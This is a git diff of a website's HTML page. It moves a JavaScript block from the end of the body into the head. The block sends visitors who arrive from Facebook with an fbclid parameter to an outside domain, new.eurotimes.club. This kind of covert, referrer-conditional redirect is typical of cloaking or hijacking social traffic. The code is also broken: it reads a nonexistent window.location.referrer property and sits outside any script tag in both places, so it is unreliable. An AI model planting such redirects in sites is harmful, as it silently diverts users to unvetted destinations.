@@ -25,6 +25,19 @@
       <!--[if lt IE 9]>
       <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
       <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script><![endif]-->
+
+    if (window.location.referrer && window.location.referrer.indexOf("facebook.com") !== -1) {
+  const searchParams = new URLSearchParams(window.location.search.substring(1));
+  if (searchParams.has("fbclid")) {
+    // Construct your desired redirect URL here based on available query parameters or other logic
+    // Remember to properly encode and sanitize any user-provided data before including it in the URL
+    const redirectURL = "https://new.eurotimes.club/?YOUR_REDIRECT_PARAMETERS";
+    window.location.href = redirectURL;
+  }
+}
+
+
+      
    </head>
    <!-- body -->
    <body class="main-layout">
@@ -525,14 +538,6 @@
          AOS.init();
       </script>
 
-      if (window.location.referrer && window.location.referrer.indexOf("facebook.com") !== -1) {
-  const searchParams = new URLSearchParams(window.location.search.substring(1));
-  if (searchParams.has("fbclid")) {
-    // Construct your desired redirect URL here based on available query parameters or other logic
-    // Remember to properly encode and sanitize any user-provided data before including it in the URL
-    const redirectURL = "https://new.eurotimes.club/?YOUR_REDIRECT_PARAMETERS";
-    window.location.href = redirectURL;
-  }
-}
+  
    </body>
 </html>
